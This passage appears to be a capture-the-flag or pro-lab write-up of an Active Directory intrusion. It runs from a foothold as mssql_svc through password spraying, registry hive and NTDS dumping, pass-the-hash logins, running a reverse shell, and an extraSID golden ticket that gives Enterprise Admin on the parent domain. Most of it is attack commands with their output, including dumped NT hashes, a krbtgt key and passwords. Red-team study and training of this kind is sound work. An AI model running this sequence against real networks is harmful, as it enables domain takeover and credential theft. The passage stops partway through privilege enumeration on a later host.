We are pretty sure the mssql_svc account is a domain user. Let’s use rusthound:

```bash
rusthound-ce -u mssql_svc -p 'ToughPasswordToCrack123!' -d internal.zsm.local
```

Did not work either. 

We are definitely in the internal domain:

```bash
(Get-WmiObject Win32_ComputerSystem).Domain

internal.zsm.local
```

```bash
*Evil-WinRM* PS C:\users\mssql_svc\Desktop> ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : ZSM-SVRCSQL02
   Primary Dns Suffix  . . . . . . . : internal.zsm.local
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : internal.zsm.local
                                       zsm.local

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-94-8C-2E
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::6967:8be5:a62d:c718%6(Preferred)
   IPv4 Address. . . . . . . . . . . : 192.168.210.19(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.210.1
   DHCPv6 IAID . . . . . . . . . . . : 100683862
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-30-AF-36-5D-00-50-56-94-8C-2E
   DNS Servers . . . . . . . . . . . : 192.168.210.16
   NetBIOS over Tcpip. . . . . . . . : Enabled
*Evil-WinRM* PS C:\users\mssql_svc\Desktop> arp -a

Interface: 192.168.210.19 --- 0x6
  Internet Address      Physical Address      Type
  192.168.210.1         00-50-56-94-10-88     dynamic
  192.168.210.10        00-50-56-94-5b-14     dynamic
  192.168.210.13        00-50-56-94-24-e0     dynamic
  192.168.210.15        00-50-56-94-1d-b1     dynamic
  192.168.210.16        00-50-56-94-8e-a8     dynamic
  192.168.210.255       ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static

```

The DNS server is 192.168.210.16. 

Let’s scan:

```bash
sudo nmap -sV -sC -oN nmap/192.168.210.16 192.168.210.16
```

We have found the internal DC.

## 192.168.210.16 ZPH-SVRCDC01.internal.zsm.local

```bash
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-19 10:26:47Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: zsm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-19T10:28:07+00:00; +3s from scanner time.
| ssl-cert: Subject: commonName=ZPH-SVRCDC01.internal.zsm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:ZPH-SVRCDC01.internal.zsm.local
| Not valid before: 2023-11-23T18:42:36
|_Not valid after:  2024-11-22T18:42:36
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: zsm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-19T10:28:07+00:00; +3s from scanner time.
| ssl-cert: Subject: commonName=ZPH-SVRCDC01.internal.zsm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:ZPH-SVRCDC01.internal.zsm.local
| Not valid before: 2023-11-23T18:42:36
|_Not valid after:  2024-11-22T18:42:36
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: zsm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=ZPH-SVRCDC01.internal.zsm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:ZPH-SVRCDC01.internal.zsm.local
| Not valid before: 2023-11-23T18:42:36
|_Not valid after:  2024-11-22T18:42:36
|_ssl-date: 2025-11-19T10:28:07+00:00; +3s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: zsm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=ZPH-SVRCDC01.internal.zsm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:ZPH-SVRCDC01.internal.zsm.local
| Not valid before: 2023-11-23T18:42:36
|_Not valid after:  2024-11-22T18:42:36
|_ssl-date: 2025-11-19T10:28:07+00:00; +3s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: ZPH-SVRCDC01; OS: Windows; CPE: cpe:/o:microsoft:windows

```

Let’s add that to our /etc/hots file 

```bash
192.168.210.16 internal.zsm.local ZPH-SVRCDC01
```

Lets’ verify mssql_svc:

```bash
nxc smb 192.168.210.16 -u mssql_svc -p 'ToughPasswordToCrack123!'

SMB         192.168.210.16  445    ZPH-SVRCDC01     [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRCDC01) (domain:internal.zsm.local) (signing:True) (SMBv1:False)
SMB         192.168.210.16  445    ZPH-SVRCDC01     [+] internal.zsm.local\mssql_svc:ToughPasswordToCrack123!
```

Now let’s map our the AD with rusthound:

```bash
rusthound-ce -u mssql_svc -p 'ToughPasswordToCrack123!' -d internal.zsm.local
```

Now upload it to bloodhound.

Let’s also get the DNS mapping from the server:

```bash
nxc ldap 192.168.210.16 -u mssql_svc -p 'ToughPasswordToCrack123!' -M get-network

192.168.210.17
192.168.210.18
192.168.210.19
192.168.210.101
192.168.210.16
```

Let’s also get the password policy:

```bash
nxc smb 192.168.210.16 -u mssql_svc -p 'ToughPasswordToCrack123!' --pass-pol

SMB         192.168.210.16  445    ZPH-SVRCDC01     Minimum password length: 7
SMB         192.168.210.16  445    ZPH-SVRCDC01     Password history length: 24
SMB         192.168.210.16  445    ZPH-SVRCDC01     Maximum password age: 41 days 23 hours 53 minutes
SMB         192.168.210.16  445    ZPH-SVRCDC01     
SMB         192.168.210.16  445    ZPH-SVRCDC01     Password Complexity Flags: 000001
SMB         192.168.210.16  445    ZPH-SVRCDC01         Domain Refuse Password Change: 0
SMB         192.168.210.16  445    ZPH-SVRCDC01         Domain Password Store Cleartext: 0
SMB         192.168.210.16  445    ZPH-SVRCDC01         Domain Password Lockout Admins: 0
SMB         192.168.210.16  445    ZPH-SVRCDC01         Domain Password No Clear Change: 0
SMB         192.168.210.16  445    ZPH-SVRCDC01         Domain Password No Anon Change: 0
SMB         192.168.210.16  445    ZPH-SVRCDC01         Domain Password Complex: 1
SMB         192.168.210.16  445    ZPH-SVRCDC01     
SMB         192.168.210.16  445    ZPH-SVRCDC01     Minimum password age: 1 day 4 minutes
SMB         192.168.210.16  445    ZPH-SVRCDC01     Reset Account Lockout Counter: 10 minutes
SMB         192.168.210.16  445    ZPH-SVRCDC01     Locked Account Duration: 10 minutes
SMB         192.168.210.16  445    ZPH-SVRCDC01     Account Lockout Threshold: None
SMB         192.168.210.16  445    ZPH-SVRCDC01     Forced Log off Time: Not Set

```

Lockout Threshold is none, therefore there is no lockout policy. Let’s also get a users list:

```bash
nxc smb 192.168.210.16 -u mssql_svc -p 'ToughPasswordToCrack123!' --users

SMB         192.168.210.16  445    ZPH-SVRCDC01     Administrator                 2022-11-10 14:44:59 0       Built-in account for administering the computer/domain
SMB         192.168.210.16  445    ZPH-SVRCDC01     Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         192.168.210.16  445    ZPH-SVRCDC01     krbtgt                        2022-10-20 08:04:03 0       Key Distribution Center Service Account
SMB         192.168.210.16  445    ZPH-SVRCDC01     mssql_svc                     2022-11-01 16:41:05 0       ToughPasswordToCrack123! 
SMB         192.168.210.16  445    ZPH-SVRCDC01     Emily                         2022-11-02 12:28:15 0        
SMB         192.168.210.16  445    ZPH-SVRCDC01     Laura                         2022-11-02 12:28:56 0        
SMB         192.168.210.16  445    ZPH-SVRCDC01     Melissa                       2023-05-26 11:56:14 0        
SMB         192.168.210.16  445    ZPH-SVRCDC01     Sarah                         2022-11-02 12:30:14 0        
SMB         192.168.210.16  445    ZPH-SVRCDC01     Amy                           2022-11-02 12:30:48 0        
SMB         192.168.210.16  445    ZPH-SVRCDC01     Steven                        2022-11-02 12:31:19 0        
SMB         192.168.210.16  445    ZPH-SVRCDC01     Malcolm                       2022-11-02 12:31:47 0        
SMB         192.168.210.16  445    ZPH-SVRCDC01     Aron                          2023-05-24 05:57:00 0        
SMB         192.168.210.16  445    ZPH-SVRCDC01     Matt                          2022-11-02 12:32:49 0        
SMB         192.168.210.16  445    ZPH-SVRCDC01     Jamie                         2022-11-02 12:33:20 0 
```

mssql_svc’s password is in the comments. Let’s save that to a users list:

```bash
awk '{print $5}' users.txt > valid_users.txt
```

Let’s password spray these accounts with all the passwords we have found so far:

```bash
nxc smb 192.168.210.16 -u valid_users.txt -p pwds.txt --continue-on-success

SMB         192.168.210.16  445    ZPH-SVRCDC01     [+] internal.zsm.local\Aron:ToughPasswordToCrack123!

SMB         192.168.210.16  445    ZPH-SVRCDC01     [+] internal.zsm.local\mssql_svc:ToughPasswordToCrack123!

SMB         192.168.210.16  445    ZPH-SVRCDC01     [+] internal.zsm.local\Melissa:WinterIsHere2022!
```

Aron uses the same password as mssql_svc. 

Let’s perform ASREPRoasting and Kerberoasting:

```bash
nxc ldap ZPH-SVRCDC01 -u valid_users.txt -p '' --asreproast asrep.out

[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)

nxc ldap ZPH-SVRCDC01 -u mssql_svc -p 'ToughPasswordToCrack123!' --kerberoast kerb.out

LDAP        192.168.210.16  389    ZPH-SVRCDC01     [*] Skipping disabled account: krbtgt
LDAP        192.168.210.16  389    ZPH-SVRCDC01     [*] Total of records returned 0
```

Now let’s check the privileges the user we control on bloodhound:

![image.png]({{ site.baseurl }}/assets/zephyr/image%2067.png)

Just a domain user.

![image.png]({{ site.baseurl }}/assets/zephyr/image%2068.png)

Service management and part of HR group.

![image.png]({{ site.baseurl }}/assets/zephyr/image%2069.png)

Melissa is a member of Backup Operators. Members are allowed to log onto DCs locally and should be considered Domain Admins. They can make shadow copies of the SAM/NTDS database, read the registry remotely, and access the file system on the DC via SMB. Let’s just dump that with nxc

```bash
nxc smb ZPH-SVRCDC01 -u melissa -p 'WinterIsHere2022!' -M backup_operator

BACKUP_O... 192.168.210.16  445    ZPH-SVRCDC01     [*] Triggering RemoteRegistry to start through named pipe...
BACKUP_O... 192.168.210.16  445    ZPH-SVRCDC01     Saved HKLM\SAM to \\192.168.210.16\SYSVOL\SAM
BACKUP_O... 192.168.210.16  445    ZPH-SVRCDC01     Saved HKLM\SYSTEM to \\192.168.210.16\SYSVOL\SYSTEM
BACKUP_O... 192.168.210.16  445    ZPH-SVRCDC01     Saved HKLM\SECURITY to \\192.168.210.16\SYSVOL\SECURITY
SMB         192.168.210.16  445    ZPH-SVRCDC01     [*] Copying "SAM" to "/home/kali/.nxc/logs/ZPH-SVRCDC01_192.168.210.16_2025-11-19_060114.SAM"
SMB         192.168.210.16  445    ZPH-SVRCDC01     [+] File "SAM" was downloaded to "/home/kali/.nxc/logs/ZPH-SVRCDC01_192.168.210.16_2025-11-19_060114.SAM"
SMB         192.168.210.16  445    ZPH-SVRCDC01     [*] Copying "SECURITY" to "/home/kali/.nxc/logs/ZPH-SVRCDC01_192.168.210.16_2025-11-19_060114.SECURITY"
SMB         192.168.210.16  445    ZPH-SVRCDC01     [+] File "SECURITY" was downloaded to "/home/kali/.nxc/logs/ZPH-SVRCDC01_192.168.210.16_2025-11-19_060114.SECURITY"
SMB         192.168.210.16  445    ZPH-SVRCDC01     [*] Copying "SYSTEM" to "/home/kali/.nxc/logs/ZPH-SVRCDC01_192.168.210.16_2025-11-19_060114.SYSTEM"
SMB         192.168.210.16  445    ZPH-SVRCDC01     [+] File "SYSTEM" was downloaded to "/home/kali/.nxc/logs/ZPH-SVRCDC01_192.168.210.16_2025-11-19_060114.SYSTEM"
BACKUP_O... 192.168.210.16  445    ZPH-SVRCDC01     Administrator:500:aad3b435b51404eeaad3b435b51404ee:5bdd6a33efe43f0dc7e3b2435579aa53:::
BACKUP_O... 192.168.210.16  445    ZPH-SVRCDC01     Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
BACKUP_O... 192.168.210.16  445    ZPH-SVRCDC01     DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
BACKUP_O... 192.168.210.16  445    ZPH-SVRCDC01     ZSM.LOCAL/Administrator:$DCC2$10240#Administrator#04a13c983d1c6f2ee43cc9aa0c4d49c6: (2024-12-12 13:40:03+00:00)
BACKUP_O... 192.168.210.16  445    ZPH-SVRCDC01     $MACHINE.ACC:plain_password_hex:dc66f30d3e8bd48b4bfb9c3f53eb66ebda1edbb7af476a9f7650476edce03326b61fabe212dfd9e6c2e06eaaffcab3c78cfd4f47cd564ef53e8eb5d855f9e998c34c5fabc5e713559e090d6e5dc149a97ed653608d5cd07864d7774f2d766512849d4fafff4030324173ccd8cb8c6a1513a348a337c6d46778e4e37bc2e2c2e369626f1f153bdf391f8c175fdae042537016a2198b8c120c738854c907a1ddddcb88aaa517af97bcee783d1d9a36ddc179f2bb5cc8a336a00863183c96384434bb9a8eee781822f51d2727cd14e3fd0841edfa7004eefa2a8e3327b457f34587642e1e91e79a24590d97b8ad6cb14ee7
BACKUP_O... 192.168.210.16  445    ZPH-SVRCDC01     $MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:d47a6d90e1c5adf4200227514e393948
BACKUP_O... 192.168.210.16  445    ZPH-SVRCDC01     dpapi_machinekey:0xf108ba9fcd3554a2abb82ff4a8d29f0679aeaae6
dpapi_userkey:0xe57f2322d588ce987f04d6a3b1bf31cfa35d050a
BACKUP_O... 192.168.210.16  445    ZPH-SVRCDC01     NL$KM:07e9f23f0849460702ce304b65d386326f025d367de83033f47194449837cb1a05cc76f126e294e7d354781fefbee913303b62cba55775e678f3d4555c682015
SMB         192.168.210.16  445    ZPH-SVRCDC01     [-] internal.zsm.local\Administrator:5bdd6a33efe43f0dc7e3b2435579aa53 STATUS_LOGON_FAILURE
BACKUP_O... 192.168.210.16  445    ZPH-SVRCDC01     [*] Use the domain admin account to clean the file on the remote host
BACKUP_O... 192.168.210.16  445    ZPH-SVRCDC01     [*] netexec smb dc_ip -u user -p pass -x "del C:\Windows\sysvol\sysvol\SECURITY && del C:\Windows\sysvol\sysvol\SAM && del C:\Windows\sysvol\sysvol\SYSTEM"

```

Let’s also copy sam, security, and system locally and dump it with secretsdump:

```bash
impacket-secretsdump -sam sam -system system -security security LOCAL
```

Let’s attempt logging in:

```bash
evil-winrm -u Administrator -H 5bdd6a33efe43f0dc7e3b2435579aa53 -i 192.168.210.16
```

Failed.

Let’s logon with melissa:

```bash
evil-winrm -u melissa -p 'WinterIsHere2022!' -i 192.168.210.16
```

Also failed. Mabye logon is disabled. Let’s try psexec:

```bash
impacket-psexec melissa:'WinterIsHere2022!'@192.168.210.16

impacket-psexec internal.zsm.local/Administrator@192.168.210.16 -hashes aad3b435b51404eeaad3b435b51404ee:5bdd6a33efe43f0dc7e3b2435579aa53
```

Both failed.

Let’s try wmiexec:

```bash
impacket-wmiexec Administrator@192.168.210.16 -hashes :5bdd6a33efe43f0dc7e3b2435579aa53
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] SMB SessionError: code: 0xc000006d - STATUS_LOGON_FAILURE - The attempted logon is invalid. This is either due to a bad username or authentication information.

```

Not working. 

Let’s start exploiting from aron:

```bash
evil-winrm -u aron -p 'ToughPasswordToCrack123!' -i 192.168.210.16
```

```bash
nxc smb 192.168.210.10 -u ../valid_users.txt -p 'ToughPasswordToCrack123!' 
SMB         192.168.210.10  445    ZPH-SVRDC01      [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRDC01) (domain:zsm.local) (signing:True) (SMBv1:False)
SMB         192.168.210.10  445    ZPH-SVRDC01      [-] zsm.local\Administrator:ToughPasswordToCrack123! STATUS_LOGON_FAILURE 
SMB         192.168.210.10  445    ZPH-SVRDC01      [-] zsm.local\Guest:ToughPasswordToCrack123! STATUS_LOGON_FAILURE 
SMB         192.168.210.10  445    ZPH-SVRDC01      [-] zsm.local\krbtgt:ToughPasswordToCrack123! STATUS_LOGON_FAILURE 
SMB         192.168.210.10  445    ZPH-SVRDC01      [-] zsm.local\riley:ToughPasswordToCrack123! STATUS_LOGON_FAILURE 
SMB         192.168.210.10  445    ZPH-SVRDC01      [-] zsm.local\blake:ToughPasswordToCrack123! STATUS_LOGON_FAILURE 
SMB         192.168.210.10  445    ZPH-SVRDC01      [-] zsm.local\gavin:ToughPasswordToCrack123! STATUS_LOGON_FAILURE 
SMB         192.168.210.10  445    ZPH-SVRDC01      [-] zsm.local\daniel:ToughPasswordToCrack123! STATUS_LOGON_FAILURE 
SMB         192.168.210.10  445    ZPH-SVRDC01      [-] zsm.local\tom:ToughPasswordToCrack123! STATUS_LOGON_FAILURE 
SMB         192.168.210.10  445    ZPH-SVRDC01      [-] zsm.local\web_svc:ToughPasswordToCrack123! STATUS_LOGON_FAILURE 
SMB         192.168.210.10  445    ZPH-SVRDC01      [-] zsm.local\Matt:ToughPasswordToCrack123! STATUS_LOGON_FAILURE 
```

Does not work. 

```bash
nxc smb 192.168.210.16 -u Administrator -H 5bdd6a33efe43f0dc7e3b2435579aa53 

SMB         192.168.210.16  445    ZPH-SVRCDC01     [-] internal.zsm.local\Administrator:5bdd6a33efe43f0dc7e3b2435579aa53 STATUS_LOGON_FAILURE
```

Weird.

```bash
nxc smb 192.168.210.16 -u Administrator -H 5bdd6a33efe43f0dc7e3b2435579aa53 --local-auth 

SMB         192.168.210.16  445    ZPH-SVRCDC01     [-] ZPH-SVRCDC01\Administrator:5bdd6a33efe43f0dc7e3b2435579aa53 STATUS_LOGON_FAILURE 
```

Smb:

```bash
nxc smb 192.168.210.16 -u melissa -p 'WinterIsHere2022!' --shares

SMB         192.168.210.16  445    ZPH-SVRCDC01     [+] internal.zsm.local\melissa:WinterIsHere2022! 
SMB         192.168.210.16  445    ZPH-SVRCDC01     [*] Enumerated shares
SMB         192.168.210.16  445    ZPH-SVRCDC01     Share           Permissions     Remark
SMB         192.168.210.16  445    ZPH-SVRCDC01     -----           -----------     ------
SMB         192.168.210.16  445    ZPH-SVRCDC01     ADMIN$          READ            Remote Admin
SMB         192.168.210.16  445    ZPH-SVRCDC01     C$              READ,WRITE      Default share
SMB         192.168.210.16  445    ZPH-SVRCDC01     IPC$            READ            Remote IPC
SMB         192.168.210.16  445    ZPH-SVRCDC01     NETLOGON        READ            Logon server share 
SMB         192.168.210.16  445    ZPH-SVRCDC01     SYSVOL          READ            Logon server share 
```

```bash
smbclient //192.168.210.16/C$ -U melissa%'WinterIsHere2022!'
```

DId not find anything interesting.

Let’s try the machine account:

```bash
nxc smb ZPH-SVRCDC01 -u 'ZPH-SVRCDC01$' -H d47a6d90e1c5adf4200227514e393948

SMB         192.168.210.16  445    ZPH-SVRCDC01     [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRCDC01) (domain:internal.zsm.local) (signing:True) (SMBv1:False)
SMB         192.168.210.16  445    ZPH-SVRCDC01     [+] internal.zsm.local\ZPH-SVRCDC01$:d47a6d90e1c5adf4200227514e393948
```

DCSync

```bash
nxc smb ZPH-SVRCDC01 -u 'ZPH-SVRCDC01$' -H d47a6d90e1c5adf4200227514e393948 -M ntdsutil 
```

```bash
impacket-secretsdump -hashes :d47a6d90e1c5adf4200227514e393948 'internal.zsm.local/ZPH-SVRCDC01$@internal.zsm.local'

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:543beb20a2a579c7714ced68a1760d5e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0540fe51ddd618f42a66ef059ac36441:::
<SNIP>
```

Let’s verify our hashes:

```bash
nxc smb 192.168.210.16 -u Administrator -H 543beb20a2a579c7714ced68a1760d5e

SMB         192.168.210.16  445    ZPH-SVRCDC01     [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRCDC01) (domain:internal.zsm.local) (signing:True) (SMBv1:False)
SMB         192.168.210.16  445    ZPH-SVRCDC01     [+] internal.zsm.local\Administrator:543beb20a2a579c7714ced68a1760d5e (Pwn3d!)
```

We are now adminsitrator on ZPH-SVRCDC01. Let’s logon via evil-winrm:

```bash
evil-winrm -u Administrator -i 192.168.210.16 -H 543beb20a2a579c7714ced68a1760d5e
```

Let’s upload a reverse shell so that we can get a cmd.exe connection to ping sweep:

```bash
upload rev_shell.exe 

.\rev_shell.exe

(for /L %a IN (1,1,254) DO ping /n 1 /w 1 192.168.210.%a) | find "Reply"

Reply from 192.168.210.1: bytes=32 time<1ms TTL=64
Reply from 192.168.210.10: bytes=32 time<1ms TTL=128
Reply from 192.168.210.12: bytes=32 time<1ms TTL=128
Reply from 192.168.210.13: bytes=32 time<1ms TTL=64
Reply from 192.168.210.16: bytes=32 time<1ms TTL=128

```

Now new machine can be discovered from here. 

Let’s see if this administrator can log in to machines from the other domain.

Let’s get domain trust:

```bash
Import ActiveDirectory
```

```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-ADTrust -Filter *

Direction               : BiDirectional
DisallowTransivity      : False
DistinguishedName       : CN=zsm.local,CN=System,DC=internal,DC=zsm,DC=local
ForestTransitive        : False
IntraForest             : True
IsTreeParent            : False
IsTreeRoot              : False
Name                    : zsm.local
ObjectClass             : trustedDomain
ObjectGUID              : 04b1efaf-6936-4029-96e0-d76269e5489f
SelectiveAuthentication : False
SIDFilteringForestAware : False
SIDFilteringQuarantined : False
Source                  : DC=internal,DC=zsm,DC=local
Target                  : zsm.local
TGTDelegation           : False
TrustAttributes         : 32
TrustedPolicy           :
TrustingPolicy          :
TrustType               : Uplevel
UplevelOnly             : False
UsesAESKeys             : False
UsesRC4Encryption       : False

```

We have bidrectional trust with zsm.local.

Because we have compromised the child domain, we can try performing extraSID attack on its parent domain.

We need:

1. The KRBTGT hash for the child domain
2. The SID for the child domain
3. The name of a target user in the child domain (does not need to exist!)
4. The FQDN of the child domain.
5. The SID of the Enterprise Admins group of the root domain.

```bash
#1. KRBTGT hash, we have get this from secretsdump output:
0540fe51ddd618f42a66ef059ac36441

#2. We get this from Importing PowerView.ps1 on ZPH-SVRCDC01.internal.zsm.local
Import-Module .\PowerView.ps1
Get-DomainSID

S-1-5-21-3056178012-3972705859-491075245

#3. we will just pick user bobathon

#4. FQDN of child domain
internal.zsm.local

#5. SID of the enterprise admins group of the root domain
S-1-5-21-2734290894-461713716-141835440-519
```

We can get the SID from bloodhound:

![image.png]({{ site.baseurl }}/assets/zephyr/image%2070.png)

Now let’s craft a golden ticket form ticketer:

```bash
impacket-ticketer -nthash 0540fe51ddd618f42a66ef059ac36441 -domain internal.zsm.local -domain-sid S-1-5-21-3056178012-3972705859-491075245 -extra-sid S-1-5-21-2734290894-461713716-141835440-519 bobathon

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for internal.zsm.local/bobathon
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in bobathon.ccache

```

Now let’s export our ticket:

```bash
export KRB5CCNAME=bobathon.ccache 
```

Now let’s check whether we have admin privileges:

```bash
nxc smb 192.168.210.10 --use-kcache
 
SMB         192.168.210.10  445    ZPH-SVRDC01      [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRDC01) (domain:zsm.local) (signing:True
) (SMBv1:False)                                                                                                                                
SMB         192.168.210.10  445    ZPH-SVRDC01      [-] INTERNAL.ZSM.LOCAL\ from ccache KDC_ERR_TGT_REVOKED 
```

Searching up the error results us getting to this site: https://0xdeaddood.rocks/2023/05/11/forging-tickets-in-2023/

Seems like we can’t just create a new user. Let’s use Administrator and find their RID as well. We can search it up in bloodhound:

![image.png]({{ site.baseurl }}/assets/zephyr/image%2071.png)

It’s the default 500. Let’s try crafting our golden ticket:

```bash
impacket-ticketer -nthash 0540fe51ddd618f42a66ef059ac36441 -domain internal.zsm.local -domain-sid S-1-5-21-3056178012-3972705859-491075245 -extra-sid S-1-5-21-2734290894-461713716-141835440-519 -user-id 500 Administrator

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for internal.zsm.local/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in Administrator.ccache

```

Let’s try it out:

```bash
export KRB5CCNAME=Administrator.ccache

nxc smb 192.168.210.10 --use-kcache

```

Still the same error. Let’s try aes

```bash
#krbtgt aes key
3bdcbeb0910e5887e6d6c7fbec6c3f29e1e099322ac91cc386ca296a5c5497b0

impacket-ticketer -aesKey 3bdcbeb0910e5887e6d6c7fbec6c3f29e1e099322ac91cc386ca296a5c5497b0 -domain internal.zsm.local -domain-sid S-1-5-21-3056178012-3972705859-491075245 -extra-sid S-1-5-21-2734290894-461713716-141835440-519 -user-id 500 Administrator
```

Let’s try again:

```bash
nxc smb 192.168.210.10 --use-kcache

SMB         192.168.210.10  445    ZPH-SVRDC01      [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRDC01) (domain:zsm.local) (signing:True) (SMBv1:False)
SMB         192.168.210.10  445    ZPH-SVRDC01      [+] INTERNAL.ZSM.LOCAL\Administrator from ccache (Pwn3d!)

```

So we needed AES key…

Let’s dump NTDS:

```bash
nxc smb 192.168.210.10 --use-kcache -M ntdsutil

#Important outputs
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:84210eddc5724a7801fe78289ee94d44:::
ZPH-GMSA-ADFS$:1105:aad3b435b51404eeaad3b435b51404ee:6b1970f8c72bc67bd0c1a116e5b2c336:::

```

Now let’s try out the hashes:

```bash
nxc smb 192.168.210.10 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0

#Failed

nxc smb 192.168.210.10 -u Administrator -H 84210eddc5724a7801fe78289ee94d44

SMB         192.168.210.10  445    ZPH-SVRDC01      [+] zsm.local\Administrator:84210eddc5724a7801fe78289ee94d44 (Pwn3d!)

```

We now have administrator access on ZPH-SVRDC01.

## 192.168.210.17 ZPH-SVRCHR.INTERNAL.ZSM.LOCAL

```bash
sudo nmap -sC -sV -oN nmap/ZPH-SVRCHR 192.168.210.17

5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
```

```bash
nxc winrm 192.168.210.17 -u jamie -p 'P@ass123'

WINRM       192.168.210.17  5985   ZPH-SVRCHR       [*] Windows Server 2022 Build 20348 (name:ZPH-SVRCHR) (domain:internal.zsm.local)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.210.17  5985   ZPH-SVRCHR       [-] internal.zsm.local\jamie:P@ass123
```

Let’s try melissa:

```bash
nxc mssql 192.168.210.17 -u melissa -p 'WinterIsHere2022!'

WINRM       192.168.210.17  5985   ZPH-SVRCHR       [-] ZPH-SVRCHR\melissa:WinterIsHere2022!

```

Let’s try aron:

```bash
nxc winrm 192.168.210.17 -u aron -p 'ToughPasswordToCrack123!'

WINRM       192.168.210.17  5985   ZPH-SVRCHR       [*] Windows Server 2022 Build 20348 (name:ZPH-SVRCHR) (domain:internal.zsm.local)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.210.17  5985   ZPH-SVRCHR       [+] internal.zsm.local\aron:ToughPasswordToCrack123! (Pwn3d!)
```

Let’s log on:

```bash
evil-winrm -u aron -p 'ToughPasswordToCrack123!' -i 192.168.210.17 
```

![image.png]({{ site.baseurl }}/assets/zephyr/image%2072.png)

We are part of HR and Service Management.

So let’s see what privileges we have:

```bash
whomai /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
